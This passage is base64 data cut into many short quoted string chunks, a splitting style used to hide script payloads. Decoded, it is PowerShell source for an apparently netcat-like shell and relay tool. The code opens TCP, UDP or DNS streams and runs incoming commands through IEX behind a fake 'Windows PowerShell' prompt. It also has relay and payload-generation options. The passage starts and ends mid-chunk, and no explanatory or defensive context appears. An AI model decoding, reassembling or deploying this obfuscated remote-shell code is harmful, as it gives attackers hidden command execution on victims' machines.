4uLiAoRVNDL0NUUkwnLCcgdG8gZXhpdCkiCiAgICAgJywnIHRyeXskU3RyZWFtMVZhcicsJ3MgPSBTdHJlYW0xX1NldHUnLCdwICRTdHJlYW0xU2V0dXBWJywnYXJzfQogICAgICBjYXRjaCcsJ3tXcml0ZS1WZXJib3NlICInLCdTdHJlYW0gMSBTZXR1cCBGJywnYWlsdXJlIiA7IHJldHVybicsJ30KICAgICAgCiAgICAgIFcnLCdyaXRlLVZlcmJvc2UgIlNlJywndHRpbmcgdXAgU3RyZWFtICcsJzIuLi4gKEVTQy9DVFJMIHQnLCdvIGV4aXQpIgogICAgICB0JywncnkKICAgICAgewogICAgICcsJyAgICRJbnRyb1Byb21wdCAnLCc9ICRFbmNvZGluZy5HZXRCJywneXRlcygiV2luZG93cyBQbycsJ3dlclNoZWxsYG5Db3B5cmknLCdnaHQgKEMpIDIwMTMgTWljJywncm9zb2Z0IENvcnBvcmF0aScsJ29uLiBBbGwgcmlnaHRzIHInLCdlc2VydmVkLmBuYG4iICsgJywnKCJQUyAiICsgKHB3ZCkuUCcsJ2F0aCArICI+ICIpKQogICAnLCcgICAgICRQcm9tcHQgPSAoJywnIlBTICIgKyAocHdkKS5QYScsJ3RoICsgIj4gIikKICAgICAnLCcgICAkQ29tbWFuZFRvRXhlJywnY3V0ZSA9ICIiICAgICAgCicsJyAgICAgICAgJERhdGEgPSAnLCckbnVsbAogICAgICB9CiAgJywnICAgIGNhdGNoCiAgICAgICcsJ3sKICAgICAgICBXcml0ZS0nLCdWZXJib3NlICJTdHJlYW0gJywnMiBTZXR1cCBGYWlsdXJlIicsJyA7IHJldHVybgogICAgICAnLCd9CiAgICAgIAogICAgICBpJywnZigkSW5wdXRUb1dyaXRlICcsJy1uZSBAKCkpCiAgICAgIHsnLCcKICAgICAgICBXcml0ZS1WJywnZXJib3NlICJXcml0aW5nICcsJ2lucHV0IHRvIFN0cmVhbSAnLCcxLi4uIgogICAgICAgIHRyJywneXskU3RyZWFtMVZhcnMgPScsJyBTdHJlYW0xX1dyaXRlRGEnLCd0YSAkSW5wdXRUb1dyaXRlJywnICRTdHJlYW0xVmFyc30KICcsJyAgICAgICBjYXRjaHtXcmknLCd0ZS1Ib3N0ICJGYWlsZWQgJywndG8gd3JpdGUgaW5wdXQgdCcsJ28gU3RyZWFtIDEiIDsgcmUnLCd0dXJufQogICAgICB9CiAgJywnICAgIAogICAgICBpZigkZCcsJyl7V3JpdGUtVmVyYm9zZSAnLCciLWQgKGRpc2Nvbm5lY3QpJywnIEFjdGl2YXRlZC4gRGlzYycsJ29ubmVjdGluZy4uLiIgOyAnLCdyZXR1cm59CiAgICAgIAogJywnICAgICBXcml0ZS1WZXJibycsJ3NlICJCb3RoIENvbW11bmknLCdjYXRpb24gU3RyZWFtcyBFJywnc3RhYmxpc2hlZC4gUmVkaScsJ3JlY3RpbmcgRGF0YSBCZXQnLCd3ZWVuIFN0cmVhbXMuLi4iJywnCiAgICAgIHdoaWxlKCRUcicsJ3VlKQogICAgICB7ICAgICAnLCcgICAKICAgICAgICB0cnkKJywnICAgICAgICB7CiAgICAgICcsJyAgICAjIyMjIyBTdHJlYW0nLCcyIFJlYWQgIyMjIyMKICAgJywnICAgICAgICRQcm9tcHQgPScsJyAkbnVsbAogICAgICAgICAnLCcgJFJldHVybmVkRGF0YSA9JywnICRudWxsCiAgICAgICAgICcsJyBpZigkQ29tbWFuZFRvRXgnLCdlY3V0ZSAtbmUgIiIpCiAgJywnICAgICAgICB7CiAgICAgICcsJyAgICAgIHRyeXtbYnl0ZVsnLCddXSRSZXR1cm5lZERhdGEgJywnPSAkRW5jb2RpbmcuR2V0QicsJ3l0ZXMoKElFWCAkQ29tbWEnLCduZFRvRXhlY3V0ZSAyPiYxJywnIHwgT3V0LVN0cmluZykpfScsJwogICAgICAgICAgICBjYXQnLCdjaHtbYnl0ZVtdXSRSZXR1Jywncm5lZERhdGEgPSAkRW5jbycsJ2RpbmcuR2V0Qnl0ZXMoKCQnLCdfIHwgT3V0LVN0cmluZykpJywnfQogICAgICAgICAgICAkUCcsJ3JvbXB0ID0gJEVuY29kaW4nLCdnLkdldEJ5dGVzKCgiUFMgJywnIiArIChwd2QpLlBhdGggKycsJyAiPiAiKSkKICAgICAgICAnLCcgIH0KICAgICAgICAgICREJywnYXRhICs9ICRJbnRyb1BybycsJ21wdAogICAgICAgICAgJEknLCdudHJvUHJvbXB0ID0gJG51JywnbGwKICAgICAgICAgICREYScsJ3RhICs9ICRSZXR1cm5lZEQnLCdhdGEKICAgICAgICAgICREJywnYXRhICs9ICRQcm9tcHQKICcsJyAgICAgICAgICRDb21tYW4nLCdkVG9FeGVjdXRlID0gIiIKJywnICAgICAgICAgICMjIyMjICcsJ1N0cmVhbTIgUmVhZCAjIyMnLCcjIwoKICAgICAgICAgIGlmJywnKCREYXRhIC1uZSAkbnVsbCcsJyl7JFN0cmVhbTFWYXJzID0nLCcgU3RyZWFtMV9Xcml0ZURhJywndGEgJERhdGEgJFN0cmVhbScsJzFWYXJzfQogICAgICAgICAnLCcgJERhdGEgPSAkbnVsbAogJywnICAgICAgIH0KICAgICAgICcsJyBjYXRjaAogICAgICAgIHsnLCcKICAgICAgICAgIFdyaXRlJywnLVZlcmJvc2UgIkZhaWxlZCcsJyB0byByZWRpcmVjdCBkYXQnLCdhIGZyb20gU3RyZWFtIDIgJywndG8gU3RyZWFtIDEiIDsgcicsJ2V0dXJuCiAgICAgICAgfQonLCcgICAgICAgIAogICAgICAgJywnIHRyeQogICAgICAgIHsKICcsJyAgICAgICAgICREYXRhLCQnLCdTdHJlYW0xVmFycyA9IFN0JywncmVhbTFfUmVhZERhdGEgJCcsJ1N0cmVhbTFWYXJzCiAgICAnLCcgICAgICBpZigkRGF0YS5MJywnZW5ndGggLWVxIDApe1N0YScsJ3J0LVNsZWVwIC1NaWxsaXMnLCdlY29uZHMgMTAwfQogICAgJywnICAgICAgaWYoJERhdGEgLScsJ25lICRudWxsKXskQ29tbWEnLCduZFRvRXhlY3V0ZSA9ICRFJywnbmNvZGluZy5HZXRTdHJpbicsJ2coJERhdGEpfQogICAgICAnLCcgICAgJERhdGEgPSAkbnVsJywnbAogICAgICAgIH0KICAgICcsJyAgICBjYXRjaAogICAgICAnLCcgIHsKICAgICAgICAgIFdyJywnaXRlLVZlcmJvc2UgIkZhaScsJ2xlZCB0byByZWRpcmVjdCAnLCdkYXRhIGZyb20gU3RyZWFtJywnIDEgdG8gU3RyZWFtIDIiICcsJzsgcmV0dXJuCiAgICAgICAnLCcgfQogICAgICB9CiAgICB9JywnCiAgICBmaW5hbGx5CiAgICcsJyB7CiAgICAgIHRyeQogICAnLCcgICB7CiAgICAgICAgV3JpJywndGUtVmVyYm9zZSAiQ2xvcycsJ2luZyBTdHJlYW0gMS4uLiInLCcKICAgICAgICBTdHJlYW0xJywnX0Nsb3NlICRTdHJlYW0xVicsJ2FycwogICAgICB9CiAgICAnLCcgIGNhdGNoCiAgICAgIHsKJywnICAgICAgICBXcml0ZS1WZScsJ3Jib3NlICJGYWlsZWQgdG8nLCcgY2xvc2UgU3RyZWFtIDEiJywnCiAgICAgIH0KICAgIH0KICcsJyB9CiAgIyMjIyMjIyMjIyAnLCdQT1dFUlNIRUxMIEZVTkNUJywnSU9OUyAjIyMjIyMjIyMjCicsJwogICMjIyMjIyMjIyMgQ08nLCdOU09MRSBGVU5DVElPTlMgJywnIyMjIyMjIyMjIwogIGZ1bicsJ2N0aW9uIFNldHVwX0NvbnMnLCdvbGUKICB7CiAgICBwYXJhJywnbSgkRnVuY1NldHVwVmFycycsJykKICAgICRGdW5jVmFycyAnLCc9IEB7fQogICAgJEZ1bmNWJywnYXJzWyJFbmNvZGluZyJdICcsJz0gTmV3LU9iamVjdCBTeXMnLCd0ZW0uVGV4dC5Bc2NpaUVuJywnY29kaW5nCiAgICAkRnVuYycsJ1ZhcnNbIk91dHB1dCJdID0nLCcgJEZ1bmNTZXR1cFZhcnNbJywnMF0KICAgICRGdW5jVmFycycsJ1siT3V0cHV0Qnl0ZXMiXSAnLCc9IFtieXRlW11dQCgpCiAgJywnICAkRnVuY1ZhcnNbIk91dCcsJ3B1dFN0cmluZyJdID0gIiInLCcKICAgIHJldHVybiAkRnVuJywnY1ZhcnMKICB9CiAgZnVuYycsJ3Rpb24gUmVhZERhdGFfQ28nLCduc29sZQogIHsKICAgIHBhJywncmFtKCRGdW5jVmFycykKICcsJyAgICREYXRhID0gJG51bGwnLCcKICAgIGlmKCRIb3N0LlVJJywnLlJhd1VJLktleUF2YWlsYScsJ2JsZSkKICAgIHsKICAgICAnLCcgJERhdGEgPSAkRnVuY1ZhJywncnNbIkVuY29kaW5nIl0uRycsJ2V0Qnl0ZXMoKFJlYWQtSG8nLCdzdCkgKyAiYG4iKQogICAgJywnfQogICAgcmV0dXJuICREYScsJ3RhLCRGdW5jVmFycwogIH0nLCcKICBmdW5jdGlvbiBXcml0JywnZURhdGFfQ29uc29sZQogICcsJ3sKICAgIHBhcmFtKCREYXQnLCdhLCRGdW5jVmFycykKICAgJywnIHN3aXRjaCgkRnVuY1ZhcicsJ3NbIk91dHB1dCJdKQogICAnLCcgewogICAgICAiSG9zdCIgJywne1dyaXRlLUhvc3QgLW4gJCcsJ0Z1bmNWYXJzWyJFbmNvZGknLCduZyJdLkdldFN0cmluZygkJywnRGF0YSl9CiAgICAgICJTdCcsJ3JpbmciIHskRnVuY1ZhcnMnLCdbIk91dHB1dFN0cmluZyJdJywnICs9ICRGdW5jVmFyc1siRScsJ25jb2RpbmciXS5HZXRTdHInLCdpbmcoJERhdGEpfQogICAgJywnICAiQnl0ZXMiIHskRnVuYycsJ1ZhcnNbIk91dHB1dEJ5dGUnLCdzIl0gKz0gJERhdGF9CiAgJywnICB9CiAgICByZXR1cm4gJCcsJ0Z1bmNWYXJzCiAgfQogIGYnLCd1bmN0aW9uIENsb3NlX0NvJywnbnNvbGUKICB7CiAgICBwYScsJ3JhbSgkRnVuY1ZhcnMpCiAnLCcgICBpZigkRnVuY1ZhcnNbJywnIk91dHB1dFN0cmluZyJdICcsJy1uZSAiIil7cmV0dXJuICQnLCdGdW5jVmFyc1siT3V0cHV0JywnU3RyaW5nIl19CiAgICBlbCcsJ3NlaWYoJEZ1bmNWYXJzWyInLCdPdXRwdXRCeXRlcyJdIC1uJywnZSBAKCkpe3JldHVybiAkRicsJ3VuY1ZhcnNbIk91dHB1dEInLCd5dGVzIl19CiAgICByZXR1Jywncm4KICB9CiAgIyMjIyMjIycsJyMjIyBDT05TT0xFIEZVTkMnLCdUSU9OUyAjIyMjIyMjIyMjJywnCiAgCiAgIyMjIyMjIyMjIycsJyBNQUlOIEZVTkNUSU9OICMnLCcjIyMjIyMjIyMKICBmdW5jJywndGlvbiBNYWluCiAgewogICcsJyAgcGFyYW0oJFN0cmVhbTEnLCdTZXR1cFZhcnMsJFN0cmVhJywnbTJTZXR1cFZhcnMpCiAgICcsJyB0cnkKICAgIHsKICAgICAnLCcgW2J5dGVbXV0kSW5wdXRUJywnb1dyaXRlID0gQCgpCiAgICcsJyAgICRFbmNvZGluZyA9IE4nLCdldy1PYmplY3QgU3lzdGVtJywnLlRleHQuQXNjaWlFbmNvZCcsJ2luZwogICAgICBpZigkaSAnLCctbmUgJG51bGwpCiAgICAgJywnIHsKICAgICAgICBXcml0ZScsJy1WZXJib3NlICJJbnB1dCAnLCdmcm9tIC1pIGRldGVjdGVkJywnLi4uIgogICAgICAgIGlmKCcsJ1Rlc3QtUGF0aCAkaSl7IFsnLCdieXRlW11dJElucHV0VG9XJywncml0ZSA9IChbaW8uZmlsZScsJ106OlJlYWRBbGxCeXRlcygnLCckaSkpIH0KICAgICAgICBlJywnbHNlaWYoJGkuR2V0VHlwZScsJygpLk5hbWUgLWVxICJCeXQnLCdlW10iKXsgW2J5dGVbXV0kJywnSW5wdXRUb1dyaXRlID0gJCcsJ2kgfQogICAgICAgIGVsc2UnLCdpZigkaS5HZXRUeXBlKCkuJywnTmFtZSAtZXEgIlN0cmluZycsJyIpeyBbYnl0ZVtdXSRJbnAnLCd1dFRvV3JpdGUgPSAkRW5jJywnb2RpbmcuR2V0Qnl0ZXMoJCcsJ2kpIH0KICAgICAgICBlbHMnLCdle1dyaXRlLUhvc3QgIlVuJywncmVjb2duaXNlZCBpbnB1dCcsJyB0eXBlLiIgOyByZXR1cm4nLCd9CiAgICAgIH0KICAgICAgJywnCiAgICAgIFdyaXRlLVZlcicsJ2Jvc2UgIlNldHRpbmcgdXAnLCcgU3RyZWFtIDEuLi4iCiAgJywnICAgIHRyeXskU3RyZWFtMScsJ1ZhcnMgPSBTdHJlYW0xX1MnLCdldHVwICRTdHJlYW0xU2V0JywndXBWYXJzfQogICAgICBjYScsJ3RjaHtXcml0ZS1WZXJib3MnLCdlICJTdHJlYW0gMSBTZXR1JywncCBGYWlsdXJlIiA7IHJldCcsJ3Vybn0KICAgICAgCiAgICAnLCcgIFdyaXRlLVZlcmJvc2UgJywnIlNldHRpbmcgdXAgU3RyZScsJ2FtIDIuLi4iCiAgICAgIHQnLCdyeXskU3RyZWFtMlZhcnMgJywnPSBTdHJlYW0yX1NldHVwICcsJyRTdHJlYW0yU2V0dXBWYXInLCdzfQogICAgICBjYXRjaHtXJywncml0ZS1WZXJib3NlICJTdCcsJ3JlYW0gMiBTZXR1cCBGYWknLCdsdXJlIiA7IHJldHVybn0KJywnICAgICAgCiAgICAgICREYScsJ3RhID0gJG51bGwKICAgICAnLCcgCiAgICAgIGlmKCRJbnB1JywndFRvV3JpdGUgLW5lIEAoKScsJykKICAgICAgewogICAgICAnLCcgIFdyaXRlLVZlcmJvc2UgJywnIldyaXRpbmcgaW5wdXQgdCcsJ28gU3RyZWFtIDEuLi4iCiAnLCcgICAgICAgdHJ5eyRTdHJlJywnYW0xVmFycyA9IFN0cmVhbScsJzFfV3JpdGVEYXRhICRJbnAnLCd1dFRvV3JpdGUgJFN0cmVhJywnbTFWYXJzfQogICAgICAgICcsJ2NhdGNoe1dyaXRlLUhvc3QnLCcgIkZhaWxlZCB0byB3cml0JywnZSBpbnB1dCB0byBTdHJlYScsJ20gMSIgOyByZXR1cm59CiAnLCcgICAgIH0KICAgICAgCiAgJywnICAgIGlmKCRkKXtXcml0ZScsJy1WZXJib3NlICItZCAoZGknLCdzY29ubmVjdCkgQWN0aXZhJywndGVkLiBEaXNjb25uZWN0aScsJ25nLi4uIiA7IHJldHVybn0nLCcKICAgICAgCiAgICAgIFdyJywnaXRlLVZlcmJvc2UgIkJvdCcsJ2ggQ29tbXVuaWNhdGlvbiAnLCdTdHJlYW1zIEVzdGFibGlzJywnaGVkLiBSZWRpcmVjdGluZycsJyBEYXRhIEJldHdlZW4gU3QnLCdyZWFtcy4uLiIKICAgICAgJywnd2hpbGUoJFRydWUpCiAgICcsJyAgIHsKICAgICAgICB0cnknLCcKICAgICAgICB7CiAgICAgJywnICAgICAkRGF0YSwkU3RyZScsJ2FtMlZhcnMgPSBTdHJlYW0nLCcyX1JlYWREYXRhICRTdHJlJywnYW0yVmFycwogICAgICAgICcsJyAgaWYoKCREYXRhLkxlbmcnLCd0aCAtZXEgMCkgLW9yICgkJywnRGF0YSAtZXEgJG51bGwpKScsJ3tTdGFydC1TbGVlcCAtTWknLCdsbGlzZWNvbmRzIDEwMH0KJywnICAgICAgICAgIGlmKCREYScsJ3RhIC1uZSAkbnVsbCl7JFMnLCd0cmVhbTFWYXJzID0gU3RyJywnZWFtMV9Xcml0ZURhdGEgJCcsJ0RhdGEgJFN0cmVhbTFWYXInLCdzfQogICAgICAgICAgJERhJywndGEgPSAkbnVsbAogICAgICcsJyAgIH0KICAgICAgICBjYXQnLCdjaAogICAgICAgIHsKICAgJywnICAgICAgIFdyaXRlLVZlcicsJ2Jvc2UgIkZhaWxlZCB0byAnLCdyZWRpcmVjdCBkYXRhIGZyJywnb20gU3RyZWFtIDIgdG8gUycsJ3RyZWFtIDEiIDsgcmV0dXInLCduCiAgICAgICAgfQogICAgJywnICAgIAogICAgICAgIHRyeScsJwogICAgICAgIHsKICAgICAnLCcgICAgICREYXRhLCRTdHJlJywnYW0xVmFycyA9IFN0cmVhbScsJzFfUmVhZERhdGEgJFN0cmUnLCdhbTFWYXJzCiAgICAgICAgJywnICBpZigoJERhdGEuTGVuZycsJ3RoIC1lcSAwKSAtb3IgKCQnLCdEYXRhIC1lcSAkbnVsbCkpJywne1N0YXJ0LVNsZWVwIC1NaScsJ2xsaXNlY29uZHMgMTAwfQonLCcgICAgICAgICAgaWYoJERhJywndGEgLW5lICRudWxsKXskUycsJ3RyZWFtMlZhcnMgPSBTdHInLCdlYW0yX1dyaXRlRGF0YSAkJywnRGF0YSAkU3RyZWFtMlZhcicsJ3N9CiAgICAgICAgICAkRGEnLCd0YSA9ICRudWxsCiAgICAgJywnICAgfQogICAgICAgIGNhdCcsJ2NoCiAgICAgICAgewogICAnLCcgICAgICAgV3JpdGUtVmVyJywnYm9zZSAiRmFpbGVkIHRvICcsJ3JlZGlyZWN0IGRhdGEgZnInLCdvbSBTdHJlYW0gMSB0byBTJywndHJlYW0gMiIgOyByZXR1cicsJ24KICAgICAgICB9CiAgICAnLCcgIH0KICAgIH0KICAgIGZpJywnbmFsbHkKICAgIHsKICAgICcsJyAgdHJ5CiAgICAgIHsKICAnLCcgICAgICAjV3JpdGUtVmVyJywnYm9zZSAiQ2xvc2luZyBTdCcsJ3JlYW0gMi4uLiIKICAgICAnLCcgICBTdHJlYW0yX0Nsb3NlJywnICRTdHJlYW0yVmFycwogICcsJyAgICB9CiAgICAgIGNhdGMnLCdoCiAgICAgIHsKICAgICAgJywnICBXcml0ZS1WZXJib3NlICcsJyJGYWlsZWQgdG8gY2xvc2UnLCcgU3RyZWFtIDIiCiAgICAgJywnIH0KICAgICAgdHJ5CiAgICcsJyAgIHsKICAgICAgICAjV3InLCdpdGUtVmVyYm9zZSAiQ2xvJywnc2luZyBTdHJlYW0gMS4uLicsJyIKICAgICAgICBTdHJlYW0nLCcxX0Nsb3NlICRTdHJlYW0xJywnVmFycwogICAgICB9CiAgICcsJyAgIGNhdGNoCiAgICAgIHsnLCcKICAgICAgICBXcml0ZS1WJywnZXJib3NlICJGYWlsZWQgdCcsJ28gY2xvc2UgU3RyZWFtIDEnLCciCiAgICAgIH0KICAgIH0KJywnICB9CiAgIyMjIyMjIyMjIycsJyBNQUlOIEZVTkNUSU9OICMnLCcjIyMjIyMjIyMKICAKICAjJywnIyMjIyMjIyMjIEdFTkVSQScsJ1RFIFBBWUxPQUQgIyMjIyMnLCcjIyMjIwogIGlmKCR1KQogJywnIHsKICAgIFdyaXRlLVZlcicsJ2Jvc2UgIlNldCBTdHJlYW0nLCcgMTogVURQIgogICAgJEZ1JywnbmN0aW9uU3RyaW5nID0gKCcsJyJmdW5jdGlvbiBTdHJlYW0nLCcxX1NldHVwYG57YG4iICsgJywnJHtmdW5jdGlvbjpTZXR1cCcsJ19VRFB9ICsgImBufWBuYG4nLCciKQogICAgJEZ1bmN0aW9uJywnU3RyaW5nICs9ICgiZnVuYycsJ3Rpb24gU3RyZWFtMV9SZWEnLCdkRGF0YWBue2BuIiArICR7JywnZnVuY3Rpb246UmVhZERhdCcsJ2FfVURQfSArICJgbn1gbmAnLCduIikKICAgICRGdW5jdGlvJywnblN0cmluZyArPSAoImZ1bicsJ2N0aW9uIFN0cmVhbTFfV3InLCdpdGVEYXRhYG57YG4iICsgJywnJHtmdW5jdGlvbjpXcml0ZScsJ0RhdGFfVURQfSArICJgbn0nLCdgbmBuIikKICAgICRGdW5jJywndGlvblN0cmluZyArPSAoIicsJ2Z1bmN0aW9uIFN0cmVhbTEnLCdfQ2xvc2VgbntgbiIgKyAkJywne2Z1bmN0aW9uOkNsb3NlXycsJ1VEUH0gKyAiYG59YG5gbiInLCcpICAgIAogICAgaWYoJGwpJywneyRJbnZva2VTdHJpbmcgPScsJyAiTWFpbiBAKCcnJycsYCRUcicsJ3VlLCcnJHAnJywnJyR0JycpICJ9JywnCiAgICBlbHNleyRJbnZvaycsJ2VTdHJpbmcgPSAiTWFpbiAnLCdAKCcnJGMnJyxgJEZhbHNlLCcnJywnJHAnJywnJyR0JycpICJ9CiAgfScsJwogIGVsc2VpZigkZG5zIC0nLCduZSAiIikKICB7CiAgICBXJywncml0ZS1WZXJib3NlICJTZScsJ3QgU3RyZWFtIDE6IEROUyInLCcKICAgICRGdW5jdGlvblN0JywncmluZyA9ICgiZnVuY3RpbycsJ24gU3RyZWFtMV9TZXR1cGAnLCdue2BuIiArICR7ZnVuY3RpJywnb246U2V0dXBfRE5TfSArICcsJyJgbn1gbmBuIikKICAgICQnLCdGdW5jdGlvblN0cmluZyArJywnPSAoImZ1bmN0aW9uIFN0cicsJ2VhbTFfUmVhZERhdGFgbnsnLCdgbiIgKyAke2Z1bmN0aW9uJywnOlJlYWREYXRhX0ROU30gKycsJyAiYG59YG5gbiIpCiAgICAnLCckRnVuY3Rpb25TdHJpbmcgJywnKz0gKCJmdW5jdGlvbiBTdCcsJ3JlYW0xX1dyaXRlRGF0YWAnLCdue2BuIiArICR7ZnVuY3RpJywnb246V3JpdGVEYXRhX0ROUycsJ30gKyAiYG59YG5gbiIpCiAnLCcgICAkRnVuY3Rpb25TdHJpJywnbmcgKz0gKCJmdW5jdGlvbicsJyBTdHJlYW0xX0Nsb3NlYG4nLCd7YG4iICsgJHtmdW5jdGlvJywnbjpDbG9zZV9ETlN9ICsgIicsJ2BufWBuYG4iKQogICAgaWYnLCcoJGwpe3JldHVybiAiVGhpJywncyBmZWF0dXJlIGlzIG5vdCcsJyBhdmFpbGFibGUuIn0KICAnLCcgIGVsc2V7JEludm9rZVN0JywncmluZyA9ICJNYWluIEAoJycnLCckYycnLCcnJHAnJywnJyRkbnMnJywnLCckZG5zZnQpICJ9CiAgfQogJywnIGVsc2UKICB7CiAgICBXcicsJ2l0ZS1WZXJib3NlICJTZXQnLCcgU3RyZWFtIDE6IFRDUCIKJywnICAgICRGdW5jdGlvblN0cicsJ2luZyA9ICgiZnVuY3Rpb24nLCcgU3RyZWFtMV9TZXR1cGBuJywne2BuIiArICR7ZnVuY3RpbycsJ246U2V0dXBfVENQfSArICInLCdgbn1gbmBuIikKICAgICRGJywndW5jdGlvblN0cmluZyArPScsJyAoImZ1bmN0aW9uIFN0cmUnLCdhbTFfUmVhZERhdGFgbntgJywnbiIgKyAke2Z1bmN0aW9uOicsJ1JlYWREYXRhX1RDUH0gKyAnLCciYG59YG5gbiIpCiAgICAkJywnRnVuY3Rpb25TdHJpbmcgKycsJz0gKCJmdW5jdGlvbiBTdHInLCdlYW0xX1dyaXRlRGF0YWBuJywne2BuIiArICR7ZnVuY3RpbycsJ246V3JpdGVEYXRhX1RDUH0nLCcgKyAiYG59YG5gbiIpCiAgJywnICAkRnVuY3Rpb25TdHJpbicsJ2cgKz0gKCJmdW5jdGlvbiAnLCdTdHJlYW0xX0Nsb3NlYG57JywnYG4iICsgJHtmdW5jdGlvbicsJzpDbG9zZV9UQ1B9ICsgImAnLCdufWBuYG4iKQogICAgaWYoJywnJGwpeyRJbnZva2VTdHJpbicsJ2cgPSAiTWFpbiBAKCcnJycsYCcsJyRUcnVlLCRwLCR0KSAifQonLCcgICAgZWxzZXskSW52b2tlJywnU3RyaW5nID0gIk1haW4gQCcsJygnJyRjJycsYCRGYWxzZSwkcCcsJywkdCkgIn0KICB9CiAgCiAnLCcgaWYoJGUgLW5lICIiKQogJywnIHsKICAgIFdyaXRlLVZlcicsJ2Jvc2UgIlNldCBTdHJlYW0nLCcgMjogUHJvY2VzcyIKICAgJywnICRGdW5jdGlvblN0cmluZycsJyArPSAoImZ1bmN0aW9uIFMnLCd0cmVhbTJfU2V0dXBgbntgJywnbiIgKyAke2Z1bmN0aW9uOicsJ1NldHVwX0NNRH0gKyAiYG4nLCd9YG5gbiIpCiAgICAkRnVuJywnY3Rpb25TdHJpbmcgKz0gKCcsJyJmdW5jdGlvbiBTdHJlYW0nLCcyX1JlYWREYXRhYG57YG4iJywnICsgJHtmdW5jdGlvbjpSZScsJ2FkRGF0YV9DTUR9ICsgImAnLCdufWBuYG4iKQogICAgJEZ1JywnbmN0aW9uU3RyaW5nICs9ICcsJygiZnVuY3Rpb24gU3RyZWEnLCdtMl9Xcml0ZURhdGFgbntgJywnbiIgKyAke2Z1bmN0aW9uOicsJ1dyaXRlRGF0YV9DTUR9ICsnLCcgImBufWBuYG4iKQogICAgJywnJEZ1bmN0aW9uU3RyaW5nICcsJys9ICgiZnVuY3Rpb24gU3QnLCdyZWFtMl9DbG9zZWBue2BuJywnIiArICR7ZnVuY3Rpb246QycsJ2xvc2VfQ01EfSArICJgbn0nLCdgbmBuIikKICAgICRJbnZvJywna2VTdHJpbmcgKz0gIkAoJycnLCckZScnKWBuYG4iCiAgfQogICcsJ2Vsc2VpZigkZXApCiAgewonLCcgICAgV3JpdGUtVmVyYm9zJywnZSAiU2V0IFN0cmVhbSAyOicsJyBQb3dlcnNoZWxsIgogICAnLCcgJEludm9rZVN0cmluZyArJywnPSAiYG5gbiIKICB9CiAgZScsJ2xzZWlmKCRyIC1uZSAiIiknLCcKICB7CiAgICBpZigkci5zJywncGxpdCgiOiIpWzBdLlRvTCcsJ293ZXIoKSAtZXEgInVkcCInLCcpCiAgICB7CiAgICAgIFdyJywnaXRlLVZlcmJvc2UgIlNldCcsJyBTdHJlYW0gMjogVURQIgonLCcgICAgICAkRnVuY3Rpb25TJywndHJpbmcgKz0gKCJmdW5jdCcsJ2lvbiBTdHJlYW0yX1NldHUnLCdwYG57YG4iICsgJHtmdW5jJywndGlvbjpTZXR1cF9VRFB9ICcsJysgImBufWBuYG4iKQogICAnLCcgICAkRnVuY3Rpb25TdHJpJywnbmcgKz0gKCJmdW5jdGlvbicsJyBTdHJlYW0yX1JlYWREYXQnLCdhYG57YG4iICsgJHtmdW5jJywndGlvbjpSZWFkRGF0YV9VRCcsJ1B9ICsgImBufWBuYG4iKQonLCcgICAgICAkRnVuY3Rpb25TJywndHJpbmcgKz0gKCJmdW5jdCcsJ2lvbiBTdHJlYW0yX1dyaXQnLCdlRGF0YWBue2BuIiArICR7JywnZnVuY3Rpb246V3JpdGVEYScsJ3RhX1VEUH0gKyAiYG59YG4nLCdgbiIpCiAgICAgICRGdW5jJywndGlvblN0cmluZyArPSAoIicsJ2Z1bmN0aW9uIFN0cmVhbTInLCdfQ2xvc2VgbntgbiIgKyAkJywne2Z1bmN0aW9uOkNsb3NlXycsJ1VEUH0gKyAiYG59YG5gbiInLCcpICAgIAogICAgICBpZigkJywnci5zcGxpdCgiOiIpLkNvdScsJ250IC1lcSAyKXskSW52b2snLCdlU3RyaW5nICs9ICgiQCgnJycsJycnLGAkVHJ1ZSwnJyIgKyAkcicsJy5zcGxpdCgiOiIpWzFdICsnLCcgIicnLCcnJHQnJykgIil9CiAgJywnICAgIGVsc2VpZigkci5zcCcsJ2xpdCgiOiIpLkNvdW50IC0nLCdlcSAzKXskSW52b2tlU3RyJywnaW5nICs9ICgiQCgnJyIgKyAnLCckci5zcGxpdCgiOiIpWzFdJywnICsgIicnLGAkRmFsc2UsJyciJywnICsgJHIuc3BsaXQoIjoiKScsJ1syXSArICInJywnJyR0JycpICInLCcpfQogICAgICBlbHNle3JlJywndHVybiAiQmFkIHJlbGF5ICcsJ2Zvcm1hdC4ifQogICAgfQonLCcgICAgaWYoJHIuc3BsaXQoJywnIjoiKVswXS5Ub0xvd2VyKCcsJykgLWVxICJkbnMiKQogICAnLCcgewogICAgICBXcml0ZS1WJywnZXJib3NlICJTZXQgU3RyZScsJ2FtIDI6IEROUyIKICAgICAnLCcgJEZ1bmN0aW9uU3RyaW5nJywnICs9ICgiZnVuY3Rpb24gUycsJ3RyZWFtMl9TZXR1cGBue2AnLCduIiArICR7ZnVuY3Rpb246JywnU2V0dXBfRE5TfSArICJgbicsJ31gbmBuIikKICAgICAgJEYnLCd1bmN0aW9uU3RyaW5nICs9JywnICgiZnVuY3Rpb24gU3RyZScsJ2FtMl9SZWFkRGF0YWBue2AnLCduIiArICR7ZnVuY3Rpb246JywnUmVhZERhdGFfRE5TfSArICcsJyJgbn1gbmBuIikKICAgICAnLCcgJEZ1bmN0aW9uU3RyaW5nJywnICs9ICgiZnVuY3Rpb24gUycsJ3RyZWFtMl9Xcml0ZURhdGEnLCdgbntgbiIgKyAke2Z1bmN0JywnaW9uOldyaXRlRGF0YV9ETicsJ1N9ICsgImBufWBuYG4iKQonLCcgICAgICAkRnVuY3Rpb25TJywndHJpbmcgKz0gKCJmdW5jdCcsJ2lvbiBTdHJlYW0yX0Nsb3MnLCdlYG57YG4iICsgJHtmdW5jJywndGlvbjpDbG9zZV9ETlN9ICcsJysgImBufWBuYG4iKQogICAnLCcgICBpZigkci5zcGxpdCgiJywnOiIpLkNvdW50IC1lcSAyKScsJ3tyZXR1cm4gIlRoaXMgZmUnLCdhdHVyZSBpcyBub3QgYXZhJywnaWxhYmxlLiJ9CiAgICAgICcsJ2Vsc2VpZigkci5zcGxpdCgnLCciOiIpLkNvdW50IC1lcSA0JywnKXskSW52b2tlU3RyaW5nICcsJys9ICgiQCgnJyIgKyAkci5zJywncGxpdCgiOiIpWzFdICsgIicsJycnLCcnIiArICRyLnNwbGl0KCcsJyI6IilbMl0gKyAiJycsJyciICcsJysgJHIuc3BsaXQoIjoiKVsnLCczXSArICInJywkZG5zZnQpICcsJyIpfQogICAgICBlbHNle3InLCdldHVybiAiQmFkIHJlbGF5JywnIGZvcm1hdC4ifQogICAgfScsJwogICAgZWxzZWlmKCRyLnMnLCdwbGl0KCI6IilbMF0uVG9MJywnb3dlcigpIC1lcS